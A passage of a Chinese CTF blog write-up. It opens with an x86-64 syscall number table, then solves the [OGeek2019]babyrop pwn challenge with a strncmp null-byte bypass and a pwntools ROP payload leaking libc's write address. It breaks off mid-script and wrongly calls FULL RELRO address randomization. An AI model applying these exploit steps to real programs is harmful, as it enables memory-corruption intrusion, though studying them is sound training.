class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位 </span></span><br><span class="line"><span class="comment">#ifndef _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="comment">#define _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define __NR_read 0</span></span><br><span class="line"><span class="comment">#define __NR_write 1</span></span><br><span class="line"><span class="comment">#define __NR_open 2</span></span><br><span class="line"><span class="comment">#define __NR_close 3</span></span><br><span class="line"><span class="comment">#define __NR_stat 4</span></span><br><span class="line"><span class="comment">#define __NR_fstat 5</span></span><br><span class="line"><span class="comment">#define __NR_lstat 6</span></span><br><span class="line"><span class="comment">#define __NR_poll 7</span></span><br><span class="line"><span class="comment">#define __NR_lseek 8</span></span><br><span class="line"><span class="comment">#define __NR_mmap 9</span></span><br><span class="line"><span class="comment">#define __NR_mprotect 10</span></span><br><span class="line"><span class="comment">#define __NR_munmap 11</span></span><br><span class="line"><span class="comment">#define __NR_brk 12</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigaction 13</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="comment">#define __NR_ioctl 16</span></span><br><span class="line"><span class="comment">#define __NR_pread64 17</span></span><br><span class="line"><span class="comment">#define __NR_pwrite64 18</span></span><br><span class="line"><span class="comment">#define __NR_readv 19</span></span><br><span class="line"><span class="comment">#define __NR_writev 20</span></span><br><span class="line"><span class="comment">#define __NR_access 21</span></span><br><span class="line"><span class="comment">#define __NR_pipe 22</span></span><br><span class="line"><span class="comment">#define __NR_select 23</span></span><br><span class="line"><span class="comment">#define __NR_sched_yield 24</span></span><br><span class="line"><span class="comment">#define __NR_mremap 25</span></span><br><span class="line"><span class="comment">#define __NR_msync 26</span></span><br><span class="line"><span class="comment">#define __NR_mincore 27</span></span><br><span class="line"><span class="comment">#define __NR_madvise 28</span></span><br><span class="line"><span class="comment">#define __NR_shmget 29</span></span><br><span class="line"><span class="comment">#define __NR_shmat 30</span></span><br><span class="line"><span class="comment">#define __NR_shmctl 31</span></span><br><span class="line"><span class="comment">#define __NR_dup 32</span></span><br><span class="line"><span class="comment">#define __NR_dup2 33</span></span><br><span class="line"><span class="comment">#define __NR_pause 34</span></span><br><span class="line"><span class="comment">#define __NR_nanosleep 35</span></span><br><span class="line"><span class="comment">#define __NR_getitimer 36</span></span><br><span class="line"><span class="comment">#define __NR_alarm 37</span></span><br><span class="line"><span class="comment">#define __NR_setitimer 38</span></span><br><span class="line"><span class="comment">#define __NR_getpid 39</span></span><br><span class="line"><span class="comment">#define __NR_sendfile 40</span></span><br><span class="line"><span class="comment">#define __NR_socket 41</span></span><br><span class="line"><span class="comment">#define __NR_connect 42</span></span><br><span class="line"><span class="comment">#define __NR_accept 43</span></span><br><span class="line"><span class="comment">#define __NR_sendto 44</span></span><br><span class="line"><span class="comment">#define __NR_recvfrom 45</span></span><br><span class="line"><span class="comment">#define __NR_sendmsg 46</span></span><br><span class="line"><span class="comment">#define __NR_recvmsg 47</span></span><br><span class="line"><span class="comment">#define __NR_shutdown 48</span></span><br><span class="line"><span class="comment">#define __NR_bind 49</span></span><br><span class="line"><span class="comment">#define __NR_listen 50</span></span><br><span class="line"><span class="comment">#define __NR_getsockname 51</span></span><br><span class="line"><span class="comment">#define __NR_getpeername 52</span></span><br><span class="line"><span class="comment">#define __NR_socketpair 53</span></span><br><span class="line"><span class="comment">#define __NR_setsockopt 54</span></span><br><span class="line"><span class="comment">#define __NR_getsockopt 55</span></span><br><span class="line"><span class="comment">#define __NR_clone 56</span></span><br><span class="line"><span class="comment">#define __NR_fork 57</span></span><br><span class="line"><span class="comment">#define __NR_vfork 58</span></span><br><span class="line"><span class="comment">#define __NR_execve 59</span></span><br><span class="line"><span class="comment">#define __NR_exit 60</span></span><br><span class="line"><span class="comment">#define __NR_wait4 61</span></span><br><span class="line"><span class="comment">#define __NR_kill 62</span></span><br><span class="line"><span class="comment">#define __NR_uname 63</span></span><br><span class="line"><span class="comment">#define __NR_semget 64</span></span><br><span class="line"><span class="comment">#define __NR_semop 65</span></span><br><span class="line"><span class="comment">#define __NR_semctl 66</span></span><br><span class="line"><span class="comment">#define __NR_shmdt 67</span></span><br><span class="line"><span class="comment">#define __NR_msgget 68</span></span><br><span class="line"><span class="comment">#define __NR_msgsnd 69</span></span><br><span class="line"><span class="comment">#define __NR_msgrcv 70</span></span><br><span class="line"><span class="comment">#define __NR_msgctl 71</span></span><br><span class="line"><span class="comment">#define __NR_fcntl 72</span></span><br><span class="line"><span class="comment">#define __NR_flock 73</span></span><br><span class="line"><span class="comment">#define __NR_fsync 74</span></span><br><span class="line"><span class="comment">#define __NR_fdatasync 75</span></span><br><span class="line"><span class="comment">#define __NR_truncate 76</span></span><br><span class="line"><span class="comment">#define __NR_ftruncate 77</span></span><br><span class="line"><span class="comment">#define __NR_getdents 78</span></span><br><span class="line"><span class="comment">#define __NR_getcwd 79</span></span><br><span class="line"><span class="comment">#define __NR_chdir 80</span></span><br><span class="line"><span class="comment">#define __NR_fchdir 81</span></span><br><span class="line"><span class="comment">#define __NR_rename 82</span></span><br><span class="line"><span class="comment">#define __NR_mkdir 83</span></span><br><span class="line"><span class="comment">#define __NR_rmdir 84</span></span><br><span class="line"><span class="comment">#define __NR_creat 85</span></span><br><span class="line"><span class="comment">#define __NR_link 86</span></span><br><span class="line"><span class="comment">#define __NR_unlink 87</span></span><br><span class="line"><span class="comment">#define __NR_symlink 88</span></span><br><span class="line"><span class="comment">#define __NR_readlink 89</span></span><br><span class="line"><span class="comment">#define __NR_chmod 90</span></span><br><span class="line"><span class="comment">#define __NR_fchmod 91</span></span><br><span class="line"><span class="comment">#define __NR_chown 92</span></span><br><span class="line"><span class="comment">#define __NR_fchown 93</span></span><br><span class="line"><span class="comment">#define __NR_lchown 94</span></span><br><span class="line"><span class="comment">#define __NR_umask 95</span></span><br><span class="line"><span class="comment">#define __NR_gettimeofday 96</span></span><br><span class="line"><span class="comment">#define __NR_getrlimit 97</span></span><br><span class="line"><span class="comment">#define __NR_getrusage 98</span></span><br><span class="line"><span class="comment">#define __NR_sysinfo 99</span></span><br><span class="line"><span class="comment">#define __NR_times 100</span></span><br><span class="line"><span class="comment">#define __NR_ptrace 101</span></span><br><span class="line"><span class="comment">#define __NR_getuid 102</span></span><br><span class="line"><span class="comment">#define __NR_syslog 103</span></span><br><span class="line"><span class="comment">#define __NR_getgid 104</span></span><br><span class="line"><span class="comment">#define __NR_setuid 105</span></span><br><span class="line"><span class="comment">#define __NR_setgid 106</span></span><br><span class="line"><span class="comment">#define __NR_geteuid 107</span></span><br><span class="line"><span class="comment">#define __NR_getegid 108</span></span><br><span class="line"><span class="comment">#define __NR_setpgid 109</span></span><br><span class="line"><span class="comment">#define __NR_getppid 110</span></span><br><span class="line"><span class="comment">#define __NR_getpgrp 111</span></span><br><span class="line"><span class="comment">#define __NR_setsid 112</span></span><br><span class="line"><span class="comment">#define __NR_setreuid 113</span></span><br><span class="line"><span class="comment">#define __NR_setregid 114</span></span><br><span class="line"><span class="comment">#define __NR_getgroups 115</span></span><br><span class="line"><span class="comment">#define __NR_setgroups 116</span></span><br><span class="line"><span class="comment">#define __NR_setresuid 117</span></span><br><span class="line"><span class="comment">#define __NR_getresuid 118</span></span><br><span class="line"><span class="comment">#define __NR_setresgid 119</span></span><br><span class="line"><span class="comment">#define __NR_getresgid 120</span></span><br><span class="line"><span class="comment">#define __NR_getpgid 121</span></span><br><span class="line"><span class="comment">#define __NR_setfsuid 122</span></span><br><span class="line"><span class="comment">#define __NR_setfsgid 123</span></span><br><span class="line"><span class="comment">#define __NR_getsid 124</span></span><br><span class="line"><span class="comment">#define __NR_capget 125</span></span><br><span class="line"><span class="comment">#define __NR_capset 126</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigpending 127</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="comment">#define __NR_sigaltstack 131</span></span><br><span class="line"><span class="comment">#define __NR_utime 132</span></span><br><span class="line"><span class="comment">#define __NR_mknod 133</span></span><br><span class="line"><span class="comment">#define __NR_uselib 134</span></span><br><span class="line"><span class="comment">#define __NR_personality 135</span></span><br><span class="line"><span class="comment">#define __NR_ustat 136</span></span><br><span class="line"><span class="comment">#define __NR_statfs 137</span></span><br><span class="line"><span class="comment">#define __NR_fstatfs 138</span></span><br><span class="line"><span class="comment">#define __NR_sysfs 139</span></span><br><span class="line"><span class="comment">#define __NR_getpriority 140</span></span><br><span class="line"><span class="comment">#define __NR_setpriority 141</span></span><br><span class="line"><span class="comment">#define __NR_sched_setparam 142</span></span><br><span class="line"><span class="comment">#define __NR_sched_getparam 143</span></span><br><span class="line"><span class="comment">#define __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="comment">#define __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="comment">#define __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="comment">#define __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="comment">#define __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="comment">#define __NR_mlock 149</span></span><br><span class="line"><span class="comment">#define __NR_munlock 150</span></span><br><span class="line"><span class="comment">#define __NR_mlockall 151</span></span><br><span class="line"><span class="comment">#define __NR_munlockall 152</span></span><br><span class="line"><span class="comment">#define __NR_vhangup 153</span></span><br><span class="line"><span class="comment">#define __NR_modify_ldt 154</span></span><br><span class="line"><span class="comment">#define __NR_pivot_root 155</span></span><br><span class="line"><span class="comment">#define __NR__sysctl 156</span></span><br><span class="line"><span class="comment">#define __NR_prctl 157</span></span><br><span class="line"><span class="comment">#define __NR_arch_prctl 158</span></span><br><span class="line"><span class="comment">#define __NR_adjtimex 159</span></span><br><span class="line"><span class="comment">#define __NR_setrlimit 160</span></span><br><span class="line"><span class="comment">#define __NR_chroot 161</span></span><br><span class="line"><span class="comment">#define __NR_sync 162</span></span><br><span class="line"><span class="comment">#define __NR_acct 163</span></span><br><span class="line"><span class="comment">#define __NR_settimeofday 164</span></span><br><span class="line"><span class="comment">#define __NR_mount 165</span></span><br><span class="line"><span class="comment">#define __NR_umount2 166</span></span><br><span class="line"><span class="comment">#define __NR_swapon 167</span></span><br><span class="line"><span class="comment">#define __NR_swapoff 168</span></span><br><span class="line"><span class="comment">#define __NR_reboot 169</span></span><br><span class="line"><span class="comment">#define __NR_sethostname 170</span></span><br><span class="line"><span class="comment">#define __NR_setdomainname 171</span></span><br><span class="line"><span class="comment">#define __NR_iopl 172</span></span><br><span class="line"><span class="comment">#define __NR_ioperm 173</span></span><br><span class="line"><span class="comment">#define __NR_create_module 174</span></span><br><span class="line"><span class="comment">#define __NR_init_module 175</span></span><br><span class="line"><span class="comment">#define __NR_delete_module 176</span></span><br><span class="line"><span class="comment">#define __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="comment">#define __NR_query_module 178</span></span><br><span class="line"><span class="comment">#define __NR_quotactl 179</span></span><br><span class="line"><span class="comment">#define __NR_nfsservctl 180</span></span><br><span class="line"><span class="comment">#define __NR_getpmsg 181</span></span><br><span class="line"><span class="comment">#define __NR_putpmsg 182</span></span><br><span class="line"><span class="comment">#define __NR_afs_syscall 183</span></span><br><span class="line"><span class="comment">#define __NR_tuxcall 184</span></span><br><span class="line"><span class="comment">#define __NR_security 185</span></span><br><span class="line"><span class="comment">#define __NR_gettid 186</span></span><br><span class="line"><span class="comment">#define __NR_readahead 187</span></span><br><span class="line"><span class="comment">#define __NR_setxattr 188</span></span><br><span class="line"><span class="comment">#define __NR_lsetxattr 189</span></span><br><span class="line"><span class="comment">#define __NR_fsetxattr 190</span></span><br><span class="line"><span class="comment">#define __NR_getxattr 191</span></span><br><span class="line"><span class="comment">#define __NR_lgetxattr 192</span></span><br><span class="line"><span class="comment">#define __NR_fgetxattr 193</span></span><br><span class="line"><span class="comment">#define __NR_listxattr 194</span></span><br><span class="line"><span class="comment">#define __NR_llistxattr 195</span></span><br><span class="line"><span class="comment">#define __NR_flistxattr 196</span></span><br><span class="line"><span class="comment">#define __NR_removexattr 197</span></span><br><span class="line"><span class="comment">#define __NR_lremovexattr 198</span></span><br><span class="line"><span class="comment">#define __NR_fremovexattr 199</span></span><br><span class="line"><span class="comment">#define __NR_tkill 200</span></span><br><span class="line"><span class="comment">#define __NR_time 201</span></span><br><span class="line"><span class="comment">#define __NR_futex 202</span></span><br><span class="line"><span class="comment">#define __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="comment">#define __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="comment">#define __NR_set_thread_area 205</span></span><br><span class="line"><span class="comment">#define __NR_io_setup 206</span></span><br><span class="line"><span class="comment">#define __NR_io_destroy 207</span></span><br><span class="line"><span class="comment">#define __NR_io_getevents 208</span></span><br><span class="line"><span class="comment">#define __NR_io_submit 209</span></span><br><span class="line"><span class="comment">#define __NR_io_cancel 210</span></span><br><span class="line"><span class="comment">#define __NR_get_thread_area 211</span></span><br><span class="line"><span class="comment">#define __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="comment">#define __NR_epoll_create 213</span></span><br><span class="line"><span class="comment">#define __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="comment">#define __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="comment">#define __NR_remap_file_pages 216</span></span><br><span class="line"><span class="comment">#define __NR_getdents64 217</span></span><br><span class="line"><span class="comment">#define __NR_set_tid_address 218</span></span><br><span class="line"><span class="comment">#define __NR_restart_syscall 219</span></span><br><span class="line"><span class="comment">#define __NR_semtimedop 220</span></span><br><span class="line"><span class="comment">#define __NR_fadvise64 221</span></span><br><span class="line"><span class="comment">#define __NR_timer_create 222</span></span><br><span class="line"><span class="comment">#define __NR_timer_settime 223</span></span><br><span class="line"><span class="comment">#define __NR_timer_gettime 224</span></span><br><span class="line"><span class="comment">#define __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="comment">#define __NR_timer_delete 226</span></span><br><span class="line"><span class="comment">#define __NR_clock_settime 227</span></span><br><span class="line"><span class="comment">#define __NR_clock_gettime 228</span></span><br><span class="line"><span class="comment">#define __NR_clock_getres 229</span></span><br><span class="line"><span class="comment">#define __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="comment">#define __NR_exit_group 231</span></span><br><span class="line"><span class="comment">#define __NR_epoll_wait 232</span></span><br><span class="line"><span class="comment">#define __NR_epoll_ctl 233</span></span><br><span class="line"><span class="comment">#define __NR_tgkill 234</span></span><br><span class="line"><span class="comment">#define __NR_utimes 235</span></span><br><span class="line"><span class="comment">#define __NR_vserver 236</span></span><br><span class="line"><span class="comment">#define __NR_mbind 237</span></span><br><span class="line"><span class="comment">#define __NR_set_mempolicy 238</span></span><br><span class="line"><span class="comment">#define __NR_get_mempolicy 239</span></span><br><span class="line"><span class="comment">#define __NR_mq_open 240</span></span><br><span class="line"><span class="comment">#define __NR_mq_unlink 241</span></span><br><span class="line"><span class="comment">#define __NR_mq_timedsend 242</span></span><br><span class="line"><span class="comment">#define __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="comment">#define __NR_mq_notify 244</span></span><br><span class="line"><span class="comment">#define __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="comment">#define __NR_kexec_load 246</span></span><br><span class="line"><span class="comment">#define __NR_waitid 247</span></span><br><span class="line"><span class="comment">#define __NR_add_key 248</span></span><br><span class="line"><span class="comment">#define __NR_request_key 249</span></span><br><span class="line"><span class="comment">#define __NR_keyctl 250</span></span><br><span class="line"><span class="comment">#define __NR_ioprio_set 251</span></span><br><span class="line"><span class="comment">#define __NR_ioprio_get 252</span></span><br><span class="line"><span class="comment">#define __NR_inotify_init 253</span></span><br><span class="line"><span class="comment">#define __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="comment">#define __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="comment">#define __NR_migrate_pages 256</span></span><br><span class="line"><span class="comment">#define __NR_openat 257</span></span><br><span class="line"><span class="comment">#define __NR_mkdirat 258</span></span><br><span class="line"><span class="comment">#define __NR_mknodat 259</span></span><br><span class="line"><span class="comment">#define __NR_fchownat 260</span></span><br><span class="line"><span class="comment">#define __NR_futimesat 261</span></span><br><span class="line"><span class="comment">#define __NR_newfstatat 262</span></span><br><span class="line"><span class="comment">#define __NR_unlinkat 263</span></span><br><span class="line"><span class="comment">#define __NR_renameat 264</span></span><br><span class="line"><span class="comment">#define __NR_linkat 265</span></span><br><span class="line"><span class="comment">#define __NR_symlinkat 266</span></span><br><span class="line"><span class="comment">#define __NR_readlinkat 267</span></span><br><span class="line"><span class="comment">#define __NR_fchmodat 268</span></span><br><span class="line"><span class="comment">#define __NR_faccessat 269</span></span><br><span class="line"><span class="comment">#define __NR_pselect6 270</span></span><br><span class="line"><span class="comment">#define __NR_ppoll 271</span></span><br><span class="line"><span class="comment">#define __NR_unshare 272</span></span><br><span class="line"><span class="comment">#define __NR_set_robust_list 273</span></span><br><span class="line"><span class="comment">#define __NR_get_robust_list 274</span></span><br><span class="line"><span class="comment">#define __NR_splice 275</span></span><br><span class="line"><span class="comment">#define __NR_tee 276</span></span><br><span class="line"><span class="comment">#define __NR_sync_file_range 277</span></span><br><span class="line"><span class="comment">#define __NR_vmsplice 278</span></span><br><span class="line"><span class="comment">#define __NR_move_pages 279</span></span><br><span class="line"><span class="comment">#define __NR_utimensat 280</span></span><br><span class="line"><span class="comment">#define __NR_epoll_pwait 281</span></span><br><span class="line"><span class="comment">#define __NR_signalfd 282</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_create 283</span></span><br><span class="line"><span class="comment">#define __NR_eventfd 284</span></span><br><span class="line"><span class="comment">#define __NR_fallocate 285</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_settime 286</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="comment">#define __NR_accept4 288</span></span><br><span class="line"><span class="comment">#define __NR_signalfd4 289</span></span><br><span class="line"><span class="comment">#define __NR_eventfd2 290</span></span><br><span class="line"><span class="comment">#define __NR_epoll_create1 291</span></span><br><span class="line"><span class="comment">#define __NR_dup3 292</span></span><br><span class="line"><span class="comment">#define __NR_pipe2 293</span></span><br><span class="line"><span class="comment">#define __NR_inotify_init1 294</span></span><br><span class="line"><span class="comment">#define __NR_preadv 295</span></span><br><span class="line"><span class="comment">#define __NR_pwritev 296</span></span><br><span class="line"><span class="comment">#define __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="comment">#define __NR_perf_event_open 298</span></span><br><span class="line"><span class="comment">#define __NR_recvmmsg 299</span></span><br><span class="line"><span class="comment">#define __NR_fanotify_init 300</span></span><br><span class="line"><span class="comment">#define __NR_fanotify_mark 301</span></span><br><span class="line"><span class="comment">#define __NR_prlimit64 302</span></span><br><span class="line"><span class="comment">#define __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="comment">#define __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="comment">#define __NR_clock_adjtime 305</span></span><br><span class="line"><span class="comment">#define __NR_syncfs 306</span></span><br><span class="line"><span class="comment">#define __NR_sendmmsg 307</span></span><br><span class="line"><span class="comment">#define __NR_setns 308</span></span><br><span class="line"><span class="comment">#define __NR_getcpu 309</span></span><br><span class="line"><span class="comment">#define __NR_process_vm_readv 310</span></span><br><span class="line"><span class="comment">#define __NR_process_vm_writev 311</span></span><br><span class="line"><span class="comment">#define __NR_kcmp 312</span></span><br><span class="line"><span class="comment">#define __NR_finit_module 313</span></span><br><span class="line"><span class="comment">#define __NR_sched_setattr 314</span></span><br><span class="line"><span class="comment">#define __NR_sched_getattr 315</span></span><br><span class="line"><span class="comment">#define __NR_renameat2 316</span></span><br><span class="line"><span class="comment">#define __NR_seccomp 317</span></span><br><span class="line"><span class="comment">#define __NR_getrandom 318</span></span><br><span class="line"><span class="comment">#define __NR_memfd_create 319</span></span><br><span class="line"><span class="comment">#define __NR_kexec_file_load 320</span></span><br><span class="line"><span class="comment">#define __NR_bpf 321</span></span><br><span class="line"><span class="comment">#define __NR_execveat 322</span></span><br><span class="line"><span class="comment">#define __NR_userfaultfd 323</span></span><br><span class="line"><span class="comment">#define __NR_membarrier 324</span></span><br><span class="line"><span class="comment">#define __NR_mlock2 325</span></span><br><span class="line"><span class="comment">#define __NR_copy_file_range 326</span></span><br><span class="line"><span class="comment">#define __NR_preadv2 327</span></span><br><span class="line"><span class="comment">#define __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endif /* _ASM_X86_UNISTD_64_H */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>2024.6.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607924.png" alt="image-20240624195530751"></p>
<p>32位架构，NX保护，FULL RELRO为地址随机化。</p>
<p>这里看了别人的wp，猜测应该是一个libc泄露的题。so这题仔细看一下，首先要了解这个函数都在干什么？</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607925.png" alt="image-20240625151320216"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457471.png" alt="image-20240625151935845"></p>
<p>sprintf（）函数将生成的随机数a1加到了s[32]的数组中。这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。</p>
<p>此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：使strncmp结果为0</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031457027.png"></p>
<p>sub_804871F()函数会将buf[7]作为参数传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）。</p>
<p>所以解题如下：</p>
<p><strong>first:让strncmp(buf, s, v1)为0</strong></p>
<p>但是当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。</p>
<p>另一种办法就是使v1等于0，这样strncmp的结果仍为0。</p>
<p>而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，<strong>让buf数组的第一位为‘\x00’即可。</strong>此时程序不会退出。</p>
<p><strong>Second：让buf[7]的值尽可能大</strong><br>前面讲到，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行。（因为要溢出）</p>
<p>ASCII码对照表：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wz947324/article/details/80076496">https://blog.csdn.net/wz947324/article/details/80076496</a></p>
<p>可以看出，在扩展的ASCII码中才有我们需要的250+的ASCII码值，而这些字符里，如果用键盘打出来，比如“≥”的ascii码值为242，但是在vscode里面可以看到，他的ASCII码值并没有242，所以用到转义字符。</p>
<p>\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。</p>
<p>奇怪的是，我把’\xff’和其他ASCII码大于128的符号放进vscode，只有用unsigned __int8转换出来的是他们的ASCII码值，而用unsigned int和int转换出来的都是负数，而ASCII码小于128的就不会出现这种情况。</p>
<p>我们还要注意到，有一个让buf[v5 - 1] &#x3D; 0的数，应该考虑该语句会不会影响到buf[7]的值。v5为read函数返回的值，参考网上资料：read函数返回的是读取的字节数。</p>
<p>答案是包含。那么我上述代码v5的值为9，那么buf[v5-1]就未影响到buf[7]的值。否则我们可能就要构造</p>
<blockquote>
<p> payload &#x3D; ‘\x00’+‘\xff’*8</p>
</blockquote>
<p><strong>Finally:ROP!</strong></p>
<h3 id="write函数泄露libc版本"><a href="#write函数泄露libc版本" class="headerlink" title="write函数泄露libc版本"></a>write函数泄露libc版本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注意事项<br>注意点：1.32位程序传参方式为栈传参，而64位程序则是优先通过寄存器传参，届时就需要用ROPgadget寻找gadgets来进行ROP了。</p>
<p> 2.32位程序里main函数地址不能用elf.sym[“main”]</p>
<p> 3.32位程序里调用函数后需要先压返回地址，再压参数。</p>
<blockquote>
<p>调用函数栈的结构为：调用函数的地址-&gt;函数返回地址-&gt;参数n-&gt;参数n-1-&gt;…..-&gt;参数1</p>
</blockquote>
<p> 4.libc题目中提供了，为libc-2-23.so，应该可以直接用，我是把他加进了Libcsearcher里然后再用的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = 